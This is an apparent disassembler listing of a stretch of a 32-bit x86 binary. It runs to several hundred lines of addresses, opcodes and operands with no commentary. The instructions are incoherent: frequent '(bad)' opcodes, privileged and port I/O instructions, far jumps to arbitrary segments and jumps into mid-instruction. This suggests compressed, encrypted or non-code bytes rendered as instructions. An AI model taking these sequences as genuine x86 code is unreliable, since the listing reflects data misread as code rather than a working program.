  4336d9:	mov    DWORD PTR [eax+ecx*4+0x9],ebp
  4336dd:	mov    eax,0xad4290c0
  4336e2:	call   0x6435035b
  4336e7:	push   es
  4336e8:	lock xchg ebp,eax
  4336ea:	ror    DWORD PTR [ebp-0x3d],0x1c
  4336ee:	mov    al,ds:0xe11c6227
  4336f3:	xchg   esi,eax
  4336f4:	cs pop ecx
  4336f6:	mov    eax,0x9af78139
  4336fb:	inc    edx
  4336fc:	sub    ebx,DWORD PTR [eax]
  4336fe:	das    
  4336ff:	dec    edi
  433700:	test   al,0xbb
  433702:	stos   BYTE PTR es:[edi],al
  433703:	cmp    al,0x4a
  433705:	mov    edx,0xe25394
  43370a:	mov    ?,WORD PTR ss:[edi+0x73]
  43370e:	pop    eax
  43370f:	mov    bl,0xe3
  433711:	add    edx,DWORD PTR [ecx-0x1df2a4c5]
  433717:	loopne 0x43373f
  433719:	aaa    
  43371a:	push   ecx
  43371b:	xor    BYTE PTR [ebx+edx*8],0xe3
  43371f:	ja     0x4336ed
  433721:	pop    ss
  433722:	mov    dl,0xdf
  433724:	mov    al,0xe2
  433726:	mov    edx,es
  433728:	add    edx,DWORD PTR [eax-0x6b]
  43372b:	pop    ebp
  43372c:	xchg   ebx,eax
  43372d:	mov    bh,0x61
  43372f:	inc    ebp
  433730:	inc    esi
  433731:	fwait
  433732:	enter  0x2cd2,0x22
  433736:	mov    ecx,0x7032cc6
  43373b:	xor    DWORD PTR [ebp-0x4e],ecx
  43373e:	dec    edx
  43373f:	push   0xffffffdb
  433741:	lods   eax,DWORD PTR ds:[esi]
  433742:	popa   
  433743:	xor    eax,0x34f53ee3
  433748:	pop    ebx
  433749:	inc    esp
  43374a:	push   esp
  43374b:	push   edi
  43374c:	and    al,0xb5
  43374e:	xchg   edx,eax
  43374f:	jmp    0x4336e5
  433751:	or     eax,0xd3732bae
  433756:	sbb    dl,BYTE PTR [esi+esi*8+0x507aa14d]
  43375d:	hlt    
  43375e:	push   edx
  43375f:	jns    0x433735
  433761:	sub    DWORD PTR [edi],edx
  433763:	popa   
  433764:	cmp    BYTE PTR [ecx],ch
  433766:	repz daa 
  433768:	rcr    BYTE PTR [ebp+0x43],cl
  43376b:	stc    
  43376c:	push   es
  43376d:	addr16 std 
  43376f:	(bad)  
  433770:	dec    ebp
  433771:	and    BYTE PTR [esi+eiz*4],bl
  433774:	and    eax,DWORD PTR [ebp-0x79f03fe5]
  43377a:	xchg   esp,eax
  43377b:	add    eax,0xd815ea26
  433780:	and    ch,dh
  433782:	(bad)  
  433783:	(bad)  
  433785:	lods   eax,DWORD PTR ds:[esi]
  433786:	jo     0x4337f9
  433788:	pop    ebx
  433789:	jo     0x433710
  43378b:	sub    ch,0x1e
  43378e:	cdq    
  43378f:	call   0x33b0:0x8a960e5f
  433796:	xchg   BYTE PTR [esi+0x77728bac],bh
  43379c:	pusha  
  43379d:	pop    ebx
  43379e:	push   ebx
  43379f:	sub    ecx,ebx
  4337a1:	cmc    
  4337a2:	daa    
  4337a3:	neg    BYTE PTR cs:[edx+0x60]
  4337a7:	push   es
  4337a8:	sub    ah,BYTE PTR [ecx+eiz*2-0x5f1beada]
  4337af:	jb     0x433739
  4337b1:	mov    ds:0x863c44c1,al
  4337b6:	fmul   DWORD PTR ds:0x4d3b9ace
  4337bc:	sbb    al,0x7d
  4337be:	mov    cl,0xa2
  4337c0:	inc    esi
  4337c1:	adc    ecx,esp
  4337c3:	stc    
  4337c4:	cvtpi2ps xmm3,QWORD PTR [ebx+0x39]
  4337c8:	sub    edi,DWORD PTR [esi-0x7a]
  4337cb:	icebp  
  4337cc:	sbb    eax,0xd62c3586
  4337d1:	inc    eax
  4337d2:	inc    esp
  4337d3:	test   al,0x97
  4337d5:	mov    WORD PTR [ecx],fs
  4337d7:	and    BYTE PTR [edi],dl
  4337d9:	mov    eax,ds:0xe5cb81af
  4337de:	mov    ah,0xed
  4337e0:	pusha  
  4337e1:	aaa    
  4337e2:	sbb    eax,DWORD PTR [ecx-0x3ba116e1]
  4337e8:	test   eax,0x983a0dda
  4337ed:	xchg   BYTE PTR [edx+0x6b],al
  4337f0:	mov    ds:0x440f5eb9,eax
  4337f5:	mov    ds:0x95f91659,eax
  4337fa:	call   eax
  4337fc:	stos   DWORD PTR es:[edi],eax
  4337fd:	pop    edi
  4337fe:	adc    al,bl
  433800:	push   esp
  433801:	mov    eax,0x41cf09a8
  433806:	fcom   QWORD PTR ds:0xe94d6f80
  43380c:	aad    0x14
  43380e:	and    eax,0x9258d0ca
  433813:	cs cdq 
  433815:	in     al,dx
  433816:	pop    ss
  433817:	push   0x6
  433819:	dec    esi
  43381a:	into   
  43381b:	call   0x9342:0xfa5f7ea6
  433822:	push   0xffffffef
  433824:	leave  
  433825:	mov    DWORD PTR [esi+0x2f787847],eax
  43382b:	fst    DWORD PTR [esi+0x6f]
  43382e:	xor    al,0x84
  433830:	or     BYTE PTR [esi-0x33],ah
  433833:	mov    ch,0xb6
  433835:	mov    esi,0x8b51ff24
  43383a:	pusha  
  43383b:	scas   eax,DWORD PTR es:[edi]
  43383c:	or     eax,edi
  43383e:	mov    bl,0x73
  433840:	jmp    0x433897
  433842:	inc    esi
  433843:	cmp    ebp,DWORD PTR [ecx-0x6c06cd7]
  433849:	loop   0x433843
  43384b:	mov    ch,bh
  43384d:	xchg   edi,eax
  43384e:	outs   dx,BYTE PTR ds:[esi]
  43384f:	adc    eax,0x853f86e7
  433854:	iret   
  433855:	jo     0x43385c
  433857:	call   0x3d8a:0x622fa6d4
  43385e:	mov    DWORD PTR [ecx+0x604eebd8],ebx
  433864:	cmp    al,ah
  433866:	jge    0x433847
  433868:	push   0xf65c8a10
  43386d:	sbb    al,BYTE PTR [ebx+0x46]
  433870:	ja     0x433858
  433872:	dec    edi
  433873:	loop   0x433824
  433875:	repnz fwait
  433877:	popa   
  433878:	arpl   WORD PTR [esi+0x63],si
  43387b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43387c:	xor    eax,0xa03aa044
  433881:	scas   eax,DWORD PTR es:[edi]
  433882:	push   0x5addea3a
  433887:	jg     0x4338af
  433889:	adc    edi,DWORD PTR ds:0x40c54cdb
  43388f:	mov    edx,0x1c8fe129
  433894:	cmc    
  433895:	sub    esp,eax
  433897:	cmp    DWORD PTR [eax+0x2],ecx
  43389a:	xor    eax,0x98d53df0
  43389f:	sti    
  4338a0:	repnz dec edx
  4338a2:	ret    0xbd4
  4338a5:	mov    eax,DWORD PTR [edi]
  4338a7:	and    dl,dl
  4338a9:	adc    ah,BYTE PTR [ebp-0x53]
  4338ac:	sub    eax,0x156922a
  4338b1:	test   BYTE PTR [ebx],0x8a
  4338b4:	push   cs
  4338b5:	popf   
  4338b6:	and    eax,0x718fb53f
  4338bb:	lds    ebx,FWORD PTR [edx]
  4338bd:	add    eax,0x116f6978
  4338c2:	mov    ds:0x3cafe8d5,eax
  4338c7:	jo     0x433885
  4338c9:	mov    DWORD PTR [eax+0x57591189],ecx
  4338cf:	sti    
  4338d0:	lea    eax,[eax+0x292b48e0]
  4338d6:	pop    ss
  4338d7:	xor    ebx,DWORD PTR [ebx+0x2824e7ae]
  4338dd:	sbb    al,0xcb
  4338df:	inc    ecx
  4338e0:	xchg   edi,eax
  4338e1:	sub    eax,0x9d03a837
  4338e6:	cmp    al,0x46
  4338e8:	mov    esi,0xff23b181
  4338ed:	test   DWORD PTR [eax],esp
  4338ef:	mov    ch,0x7e
  4338f1:	add    BYTE PTR [edx],al
  4338f3:	jmp    0xc2ce5e91
  4338f8:	mov    ecx,0x8e8a48a3
  4338fd:	loop   0x4338e0
  4338ff:	retf   
  433900:	bound  ebx,QWORD PTR [ebx+0x5b]
  433903:	xor    ebx,DWORD PTR [ebx+0x4c]
  433906:	popf   
  433907:	lahf   
  433908:	jb     0x43391b
  43390a:	das    
  43390b:	cmp    BYTE PTR [edx],0xdb
  43390e:	repz in al,dx
  433910:	mov    ch,0xe6
  433912:	aad    0x9d
  433914:	jbe    0x4338fd
  433916:	sbb    DWORD PTR [edi+0xd],eax
  433919:	xor    al,0x3c
  43391b:	aaa    
  43391c:	mov    ds:0x7d190645,eax
  433921:	push   0xffffffb6
  433923:	fisub  WORD PTR [ecx+0x261e0f77]
  433929:	pop    ebx
  43392a:	jns    0x433990
  43392c:	leave  
  43392d:	cmp    al,0x41
  43392f:	jne    0x43393d
  433931:	add    ch,BYTE PTR [edx+ebx*4-0x69]
  433935:	repnz mov esi,0x74a79cc
  43393b:	pop    edx
  43393c:	sbb    edi,DWORD PTR [edi+ecx*8-0x5d]
  433940:	cmp    eax,0xb4e96b1d
  433945:	push   esi
  433946:	pop    edi
  433947:	inc    ebp
  433948:	dec    esp
  433949:	fstp   DWORD PTR [esi+0x35]
  43394c:	inc    esp
  43394d:	xchg   esi,eax
  43394e:	gs aas 
  433950:	and    esp,esi
  433952:	out    dx,al
  433953:	sub    BYTE PTR es:[edi-0x7e],dl
  433957:	cmp    bh,BYTE PTR [esi+0x72]
  43395a:	inc    esi
  43395b:	inc    ebx
  43395c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43395d:	pop    es
  43395e:	fistp  QWORD PTR [ebp+0x57bb3c36]
  433964:	fistp  WORD PTR [esi]
  433966:	or     bl,al
  433968:	push   es
  433969:	shl    DWORD PTR [eax-0x60],0x7
  43396d:	sahf   
  43396e:	imul   esi,ecx,0xb7d55575
  433974:	std    
  433975:	cmp    BYTE PTR [ebx+0x4da03acd],al
  43397b:	jmp    0x8331:0x8a8ee214
  433982:	jmp    0x43397e
  433984:	xor    BYTE PTR [edi+0x7b],cl
  433987:	cmc    
  433988:	push   eax
  433989:	pushf  
  43398a:	jb     0x43391f
  43398c:	pcmpgtw mm6,mm0
  43398f:	mov    bl,0xe0
  433991:	loope  0x43392c
  433993:	cmp    al,0xa6
  433995:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  433997:	mov    edi,0x178a4fb8
  43399c:	pushf  
  43399d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43399e:	or     bh,bl
  4339a0:	pop    esp
  4339a1:	cwde   
  4339a2:	xchg   bl,cl
  4339a4:	cmp    DWORD PTR ds:0xe7fb628b,0xb29d0e1d
  4339ae:	sbb    esi,DWORD PTR [ebx+0x1ad84d4e]
  4339b4:	pop    ebx
  4339b5:	xchg   DWORD PTR [ebx-0x48],ecx
  4339b8:	pop    edx
  4339b9:	(bad)  
  4339ba:	call   0x3dc86d35
  4339bf:	hlt    
  4339c0:	and    esi,eax
  4339c2:	sub    DWORD PTR [esi+0x6e777fdc],ebx
  4339c8:	lods   al,BYTE PTR ds:[esi]
  4339c9:	inc    esi
  4339ca:	cmp    al,0x6c
  4339cc:	adc    BYTE PTR [esi+0x6365246],dl
  4339d2:	mov    dl,0xc9
  4339d4:	add    edx,ecx
  4339d6:	adc    DWORD PTR [ecx+esi*1+0x19],esi
  4339da:	xor    DWORD PTR [edx+0x6a],0xfe9e9eef
  4339e1:	sub    esp,0xffffffab
  4339e4:	xor    dh,al
  4339e6:	popf   
  4339e7:	lods   eax,DWORD PTR ds:[esi]
  4339e8:	cmc    
  4339e9:	push   eax
  4339ea:	push   esp
  4339eb:	out    dx,al
  4339ec:	xchg   esi,eax
  4339ed:	bound  ebx,QWORD PTR [eax+0x34d9cc71]
  4339f3:	mov    dl,0x8a
  4339f5:	mov    DWORD PTR [ebp+ecx*1+0x4b7e9c4e],ebp
  4339fc:	mov    eax,0xdaf6fe7f
  433a01:	add    cl,BYTE PTR [eax-0x6d]
  433a04:	xor    ah,ch
  433a06:	clc    
  433a07:	clc    
  433a08:	enter  0xf89d,0xc2
  433a0c:	cmp    DWORD PTR [ebx+0x1b884669],ebp
  433a12:	fistp  WORD PTR [esi]
  433a14:	dec    eax
  433a15:	and    eax,0x70779932
  433a1a:	lods   eax,DWORD PTR ds:[esi]
  433a1b:	or     BYTE PTR [ebp-0x2b8543f6],dh
  433a21:	sbb    al,BYTE PTR [edx-0x507b171d]
  433a27:	mov    ecx,0x30983e31
  433a2c:	and    al,BYTE PTR [eax-0x2f]
  433a2f:	mul    BYTE PTR [esp+ebx*1]
  433a32:	mov    ss,WORD PTR [edx-0x54e7f27f]
  433a38:	fst    st(2)
  433a3a:	jns    0x433a61
  433a3c:	fldcw  WORD PTR [ecx]
  433a3e:	test   DWORD PTR [esi-0x17c9b3e6],edi
  433a44:	sar    DWORD PTR [edi+0x1f61e979],cl
  433a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433a4b:	gs mov esi,0x458b99e0
  433a51:	xchg   esi,eax
  433a52:	push   esi
  433a53:	xchg   ecx,eax
  433a54:	loope  0x433a9a
  433a56:	jg     0x433a64
  433a58:	fbld   TBYTE PTR [edx-0x2d29c6d]
  433a5e:	rol    DWORD PTR [esi-0x36],0x50
  433a62:	fistp  QWORD PTR [ecx-0x10dc7274]
  433a68:	mov    ds,WORD PTR [ebx+0x28]
  433a6b:	mov    al,ds:0x313b3bcb
  433a70:	dec    ecx
  433a71:	inc    edi
  433a72:	xchg   edi,eax
  433a73:	add    DWORD PTR [ecx-0x1605cf3d],esi
  433a79:	retf   0x10d6
  433a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433a7d:	add    DWORD PTR [ecx-0x7d258d2f],ebp
  433a83:	dec    esp
  433a84:	retf   0x3a48
  433a87:	scas   al,BYTE PTR es:[edi]
  433a88:	imul   edi,DWORD PTR [esi],0x31
  433a8b:	jae    0x433a5b
  433a8d:	popa   
  433a8e:	and    ah,BYTE PTR [ebx-0x25b84119]
  433a94:	das    
  433a95:	daa    
  433a96:	push   ss
  433a97:	ins    BYTE PTR es:[edi],dx
  433a98:	cmp    BYTE PTR [ebx-0x2e239db7],dh
  433a9e:	popf   
  433a9f:	xchg   BYTE PTR [esi+ecx*8],ah
  433aa2:	fs add eax,0x8901f6fb
  433aa8:	mov    eax,0x4192eb84
  433aad:	or     esp,esp
  433aaf:	in     al,dx
  433ab0:	xchg   ebp,eax
  433ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ab2:	xor    eax,0x6e36d4bc
  433ab7:	add    DWORD PTR [edx-0x4b],esp
  433aba:	stc    
  433abb:	mov    esp,DWORD PTR [edx-0x68]
  433abe:	and    edi,DWORD PTR [edx]
  433ac0:	cmp    ecx,DWORD PTR ds:0xd16aa36f
  433ac6:	frstor [ebp-0x64]
  433ac9:	push   0x1c
  433acb:	out    0x62,eax
  433acd:	pop    ss
  433ace:	xor    dh,ah
  433ad0:	mov    ds:0x998623e,eax
  433ad5:	or     BYTE PTR [edi+0x65b2de0b],bh
  433adb:	inc    ebx
  433adc:	mov    ecx,0xb18f7db
  433ae1:	sub    cl,0xe7
  433ae4:	xchg   al,ch
  433ae6:	xchg   ecx,eax
  433ae7:	cmc    
  433ae8:	mov    bh,bl
  433aea:	jecxz  0x433ac2
  433aec:	add    eax,0xcdb0b7bb
  433af1:	push   0xffffffda
  433af3:	js     0x433b0f
  433af5:	xchg   DWORD PTR [ecx],esp
  433af7:	xor    ecx,DWORD PTR [edi]
  433af9:	add    dl,cl
  433afb:	or     eax,0x2df518df
  433b00:	loopne 0x433ad6
  433b02:	cli    
  433b03:	aad    0x16
  433b05:	test   eax,0x47ef1834
  433b0a:	mov    al,ds:0xce3ddbda
  433b0f:	sub    BYTE PTR [edx],dl
  433b11:	dec    esp
  433b12:	mov    esi,0x6d76fe5e
  433b17:	adc    bh,BYTE PTR [ebx]
  433b19:	jbe    0x433ab9
  433b1b:	jle    0x433aaf
  433b1d:	xchg   dl,ah
  433b1f:	push   0x69
  433b21:	aam    0x74
  433b23:	addr16 inc esi
  433b25:	int    0x94
  433b27:	push   0x4ce646
  433b2c:	fwait
  433b2d:	aaa    
  433b2e:	or     dl,BYTE PTR [edi]
  433b30:	pusha  
  433b31:	sbb    DWORD PTR [edi+0x66],0x9681525e
  433b38:	(bad)  
  433b39:	mov    eax,0x180e4bab
  433b3e:	dec    ecx
  433b3f:	rcl    BYTE PTR [esi-0x29],cl
  433b42:	pop    esp
  433b43:	add    al,0x21
  433b45:	sub    al,BYTE PTR [eax]
  433b47:	out    dx,al
  433b48:	out    0xb6,al
  433b4a:	or     eax,0x939870bc
  433b4f:	outs   dx,DWORD PTR ds:[esi]
  433b50:	or     cl,al
  433b52:	fs icebp 
  433b54:	aaa    
  433b55:	bound  edx,QWORD PTR [ebx+0xe88bb7b]
  433b5b:	out    dx,al
  433b5c:	inc    eax
  433b5d:	loope  0x433b01
  433b5f:	daa    
  433b60:	mov    WORD PTR [edi+0x1a],ds
  433b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433b64:	push   esp
  433b65:	mov    cl,0xf2
  433b67:	dec    esi
  433b68:	ds fsub st,st(6)
  433b6b:	ror    DWORD PTR [ecx-0x1d06fae5],cl
  433b71:	iret   
  433b72:	jne    0x433ba9
  433b74:	mov    ds:0x85df603e,eax
  433b79:	sahf   
  433b7a:	lahf   
  433b7b:	popf   
  433b7c:	sti    
  433b7d:	xchg   esp,eax
  433b7e:	sbb    BYTE PTR [ebp-0x23],bh
  433b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433b82:	or     edx,DWORD PTR [ebx+0x22]
  433b85:	aaa    
  433b86:	push   0xffffffe4
  433b88:	int3   
  433b89:	jb     0x433b9f
  433b8b:	and    eax,0x6ed4aa0
  433b90:	mov    bh,0xea
  433b92:	dec    edi
  433b93:	mov    ecx,DWORD PTR [ebx+0x63]
  433b96:	loope  0x433bd0
  433b98:	cmc    
  433b99:	xor    BYTE PTR [eax],al
  433b9b:	mov    ah,0xe6
  433b9d:	jnp    0x433bd4
  433b9f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  433ba1:	clc    
  433ba2:	addr16 leave 
  433ba4:	fs pop ss
  433ba6:	mov    ds:0x60287bb9,al
  433bab:	not    ch
  433bad:	xchg   BYTE PTR [edi-0x5ee8b36e],cl
  433bb3:	dec    ecx
  433bb4:	sar    edx,cl
  433bb6:	xchg   esi,eax
  433bb7:	rcl    BYTE PTR [esi-0x65],0xd3
  433bbb:	jp     0x433bc7
  433bbd:	pop    esi
  433bbe:	jo     0x433b74
  433bc0:	inc    ebp
  433bc1:	push   0x15
  433bc3:	or     ecx,ebx
  433bc5:	clc    
  433bc6:	cmp    eax,DWORD PTR [ecx+edx*1+0x6d]
  433bca:	jp     0x433bd1
  433bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433bcd:	mov    ah,0x1
  433bcf:	cdq    
  433bd0:	dec    esi
  433bd1:	stc    
  433bd2:	dec    eax
  433bd3:	scas   eax,DWORD PTR es:[edi]
  433bd4:	xchg   esi,eax
  433bd5:	ret    0xc72
  433bd8:	sub    edx,ebx
  433bda:	add    ah,BYTE PTR ds:0x1b8f9625
  433be0:	nop
  433be1:	sub    DWORD PTR [ebx],ebp
  433be3:	adc    DWORD PTR [ecx],ebp
  433be5:	rcl    BYTE PTR [eax+eax*4-0x6a3c6a00],0xa5
  433bed:	xor    ah,BYTE PTR [edi+0x4d79d555]
  433bf3:	fmul   st(3),st
  433bf5:	push   es
  433bf6:	mov    al,0xe2
  433bf8:	xchg   ebx,eax
  433bf9:	pop    es
  433bfa:	xchg   edi,eax
  433bfb:	frstor [ebx+ebp*2]
  433bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433bff:	pop    esi
  433c00:	not    cl
  433c02:	mov    al,0xb6
  433c04:	retf   
  433c05:	mov    ebp,0x157adfe2
  433c0a:	pop    ebp
  433c0b:	pop    edi
  433c0c:	inc    ebx
  433c0d:	and    esp,edi
  433c0f:	jmp    0x95e8:0xa9dccd01
  433c16:	fnstsw WORD PTR [eax]
  433c18:	inc    esp
  433c19:	sub    al,0xb2
  433c1b:	(bad)  
  433c1c:	call   0x3b6f:0xd426e10
  433c23:	cmp    eax,0xf92847d8
  433c28:	mov    bl,0x24
  433c2a:	sub    esi,0x7f
  433c2d:	and    BYTE PTR ds:0x9d710590,0xf5
  433c34:	cmovl  edx,DWORD PTR ds:0xc067e9db
  433c3b:	je     0x433bdd
  433c3d:	js     0x433c13
  433c3f:	jbe    0x433cbd
  433c41:	hlt    
  433c42:	dec    ebx
  433c43:	push   es
  433c44:	(bad)  
  433c45:	in     eax,dx
  433c46:	iret   
  433c47:	in     eax,dx
  433c48:	arpl   WORD PTR [ebp+0x2b],dx
  433c4b:	pop    ebp
  433c4c:	push   esi
  433c4d:	jnp    0x433c0b
  433c4f:	jne    0x433c4a
  433c51:	inc    edi
  433c52:	add    DWORD PTR [edi-0x12b148e8],esp
  433c58:	sub    DWORD PTR [eax+0xf0c8b02],ebx
  433c5e:	mov    ds:0x99a3edbd,al
  433c63:	dec    eax
  433c64:	push   ebx
  433c65:	adc    BYTE PTR [edx+0x6e],cl
  433c68:	sub    dl,BYTE PTR ds:0x924531fd
  433c6e:	in     al,0xda
  433c70:	dec    esi
  433c71:	mov    edi,0xf701be2d
  433c77:	(bad)  
  433c78:	xor    cl,bh
  433c7a:	dec    esp
  433c7b:	clc    
  433c7c:	inc    esp
  433c7d:	mov    ecx,0x37bb7ee3
  433c82:	xor    BYTE PTR [eax+0x3b],0xb4
  433c86:	or     eax,0x83f329b0
  433c8b:	push   ebx
  433c8c:	iret   
  433c8d:	icebp  
  433c8e:	cld    
  433c8f:	xchg   DWORD PTR [eax+0x71371fed],ebx
  433c95:	pushf  
  433c96:	fnstcw WORD PTR [edx]
  433c98:	jecxz  0x433c58
  433c9a:	jge    0x433cd8
  433c9c:	call   0xd295:0xb25eda72
  433ca3:	ins    BYTE PTR es:[edi],dx
  433ca4:	pop    ebp
  433ca5:	jmp    0x8e1e:0x9e1ec375
  433cac:	push   edx
  433cad:	call   0x700:0xc01f9606
  433cb4:	or     eax,0x61a901e9
  433cb9:	xor    BYTE PTR [edi-0x6697fdc6],cl
  433cbf:	repnz xor al,0xd5
  433cc2:	jns    0x433cc9
  433cc4:	mov    al,0xe9
  433cc6:	or     dl,BYTE PTR [edx]
  433cc8:	mov    al,ds:0x32ef6a35
  433ccd:	mov    ds:0xe38fd571,eax
  433cd2:	sbb    al,0x7a
  433cd4:	out    0x1f,al
  433cd6:	pusha  
  433cd7:	push   esp
  433cd8:	mov    cl,0xb6
  433cda:	push   edx
  433cdb:	ins    BYTE PTR es:[edi],dx
  433cdc:	ds cmp al,0xa4
  433cdf:	mov    dh,BYTE PTR [ebx]
  433ce1:	stos   DWORD PTR es:[edi],eax
  433ce2:	adc    dh,dl
  433ce4:	hlt    
  433ce5:	jo     0x433cdc
  433ce7:	dec    edi
  433ce8:	ret    
  433ce9:	dec    esi
  433cea:	loope  0x433d50
  433cec:	aam    0x39
  433cee:	push   edx
  433cef:	aad    0xd8
  433cf1:	popa   
  433cf2:	pop    esi
  433cf3:	jmp    0x433c8d
  433cf5:	div    BYTE PTR [esi]
  433cf7:	dec    edi
  433cf8:	test   eax,0xf8d82f17
  433cfd:	stos   DWORD PTR es:[edi],eax
  433cfe:	jnp    0x433d37
  433d00:	sub    DWORD PTR [edx-0x18],0x6f
  433d04:	lods   eax,DWORD PTR ds:[esi]
  433d05:	jge    0x433d24
  433d07:	mov    bl,0xf5
  433d09:	(bad)  
  433d0a:	pop    ss
  433d0b:	stos   DWORD PTR es:[edi],eax
  433d0c:	lea    esp,[ebx]
  433d0e:	popf   
  433d0f:	stc    
  433d10:	(bad)  
  433d11:	shl    BYTE PTR [esp+edx*4],cl
  433d14:	(bad)  
  433d16:	clc    
  433d17:	not    DWORD PTR [ebx]
  433d19:	adc    DWORD PTR [edi+0x281e6d5d],edi
  433d1f:	loop   0x433ce4
  433d21:	dec    eax
  433d22:	lahf   
  433d23:	inc    esp
  433d24:	pop    esi
  433d25:	and    ebp,DWORD PTR [ebp-0x16]
  433d28:	jle    0x433d0d
  433d2a:	daa    
  433d2b:	fadd   QWORD PTR [esi-0x59db610]
  433d31:	shr    BYTE PTR [ecx],1
  433d33:	lods   al,BYTE PTR ds:[esi]
  433d34:	not    BYTE PTR [esi-0xde17c25]
  433d3a:	(bad)  
  433d3b:	fdiv   QWORD PTR [ecx]
  433d3d:	or     al,0x9b
  433d3f:	sar    BYTE PTR [ecx+0x5d474cb1],0x47
  433d46:	push   ss
  433d47:	cdq    
  433d48:	(bad)  
  433d49:	in     eax,dx
  433d4a:	icebp  
  433d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433d4c:	jnp    0x433d61
  433d4e:	sub    dh,dl
  433d50:	or     eax,0xa2ac5eb6
  433d55:	dec    edi
  433d56:	ins    BYTE PTR es:[edi],dx
  433d57:	mov    ecx,0x8b4a5b4
  433d5c:	cs ja  0x433d40
  433d5f:	into   
  433d60:	mov    edi,0x3b2fa334
  433d65:	cmp    BYTE PTR [eax+0x2b6d4d6d],al
  433d6b:	xor    dl,dl
  433d6d:	das    
  433d6e:	inc    edx
  433d6f:	ficomp WORD PTR [edx]
  433d71:	sahf   
  433d72:	mov    edx,0x9b29bca9
  433d77:	stos   BYTE PTR es:[edi],al
  433d78:	jo     0x433cfb
  433d7a:	jmp    0x9702:0x3c11d260
  433d81:	xor    DWORD PTR [ebp-0x38],edx
  433d84:	out    dx,eax
  433d85:	jg     0x433dd3
  433d87:	(bad)  
  433d88:	aad    0x72
  433d8a:	fsub   DWORD PTR [edi-0x28d3e99]
  433d90:	data16 mov dh,0xee
  433d93:	xor    DWORD PTR [edi+0x39],0xfa5ef4c8
  433d9a:	(bad)  
  433d9b:	jb     0x433d43
  433d9d:	sbb    eax,0x2dc3d178
  433da2:	out    dx,eax
  433da3:	cmp    BYTE PTR [ebp+0x75],dh
  433da6:	push   ebx
  433da7:	jo     0x433d3d
  433da9:	jl     0x433d45
  433dab:	call   0xa07d:0x8ff2c883
  433db2:	and    eax,0xa15e9536
  433db7:	mov    ebp,0x5888b64
  433dbc:	imul   ebp,DWORD PTR [edi+0x36],0xa2e3d5f1
  433dc3:	ror    ecx,1
  433dc5:	xlat   BYTE PTR ds:[ebx]
  433dc6:	inc    esp
  433dc7:	fxch   st(0)
  433dc9:	jns    0x433dc2
  433dcb:	int    0x1d
  433dcd:	xchg   ebx,eax
  433dce:	fs js  0x433df6
  433dd1:	mov    gs,WORD PTR [edx+eiz*8]
  433dd4:	out    dx,eax
  433dd5:	test   BYTE PTR [esi+esi*4+0x2c],ah
  433dd9:	aad    0xfa
  433ddb:	(bad)  
  433ddc:	data16 cmp ch,ah
  433ddf:	retf   
  433de0:	into   
  433de1:	daa    
  433de2:	or     eax,0xdcdce7d7
  433de7:	cmp    ah,BYTE PTR [ebp+0x172f9d52]
  433ded:	rcr    DWORD PTR [ebp-0x2a],0xbc
  433df1:	cmp    eax,0x13642e0f
  433df6:	inc    ecx
  433df7:	test   eax,0x86f896df
  433dfc:	jmp    0x67594cf3
  433e01:	pop    ecx
  433e02:	adc    eax,0x2b776d2d
  433e07:	pop    edx
  433e08:	imul   edi,DWORD PTR [ebx+edx*1],0x57
  433e0c:	mov    eax,ds:0x3de3d222
  433e11:	xor    BYTE PTR [ecx+eax*1+0x61ce4296],bh
  433e18:	out    0x7c,eax
  433e1a:	adc    DWORD PTR [esi],esp
  433e1c:	push   edi
  433e1d:	mov    edi,0x23d4e284
  433e22:	int3   
  433e23:	out    dx,al
  433e24:	adc    al,0x16
  433e26:	(bad)  
  433e27:	add    DWORD PTR [eax+0x184f4057],0x40
  433e2e:	aaa    
  433e2f:	cli    
  433e30:	pop    edx
  433e31:	sub    al,BYTE PTR [ebx]
  433e33:	or     bh,BYTE PTR [ebx-0x58771e13]
  433e39:	adc    DWORD PTR [edi-0x7770069],esp
  433e3f:	adc    DWORD PTR [esi+0x53102033],ecx
  433e45:	fst    st(6)
  433e47:	push   ss
  433e48:	test   al,0x18
  433e4a:	jbe    0x433e40
  433e4c:	add    al,0xad
  433e4e:	jb     0x433de8
  433e50:	ret    0x4a96
  433e53:	sub    BYTE PTR [eax-0x3fe4b3ed],cl
  433e59:	lods   al,BYTE PTR ds:[esi]
  433e5a:	div    DWORD PTR [edi]
  433e5c:	sub    al,0xfa
  433e5e:	stos   BYTE PTR es:[edi],al
  433e5f:	xchg   BYTE PTR [edx-0x78df883d],bl
  433e65:	cmp    BYTE PTR ds:0xa8617334,dh
  433e6b:	and    ah,bh
  433e6d:	sub    eax,0x7c255482
  433e72:	call   0xce10ffb
  433e77:	jne    0x433eea
  433e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433e7a:	or     eax,DWORD PTR [ebp-0x7]
  433e7d:	and    eax,0x686b3f1b
  433e82:	fbstp  TBYTE PTR [ebx+0x74]
  433e85:	or     ebx,DWORD PTR [ebx]
  433e87:	mov    edx,0x94310b7d
  433e8c:	jnp    0x433efe
  433e8e:	inc    ebx
  433e8f:	jno    0x433e13
  433e91:	sub    ch,BYTE PTR [ebp-0x4684744a]
  433e97:	ret    
  433e98:	cmp    esi,ecx
  433e9a:	cdq    
  433e9b:	sbb    DWORD PTR [ecx],edx
  433e9d:	mov    BYTE PTR [esi-0x28b3a94a],al
  433ea3:	ss test al,0xb1
  433ea6:	jle    0x433eaa
  433ea8:	clc    
  433ea9:	add    al,0x21
  433eab:	mov    cl,0xc3
  433ead:	push   ss
  433eae:	fdiv   QWORD PTR [edi]
  433eb0:	adc    al,0xa4
  433eb2:	adc    ecx,esi
  433eb4:	aaa    
  433eb5:	xchg   ebp,eax
  433eb6:	pop    edi
  433eb7:	repnz loopne 0x433e7a
  433eba:	and    bh,dl
  433ebc:	jl     0x433edc
  433ebe:	inc    edi
  433ebf:	jge    0x433eb1
